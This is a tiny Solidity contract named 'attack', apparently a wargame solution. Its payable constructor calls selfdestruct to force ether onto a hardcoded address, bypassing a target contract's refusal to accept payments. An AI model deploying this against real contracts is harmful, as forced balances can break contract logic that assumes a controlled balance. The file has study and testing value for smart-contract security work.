// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract attack {
    constructor() payable {
        selfdestruct(payable(0x3e59acfC37f3Ae6Adb0fAdca65d0f23b9a9025B3));
    }
}
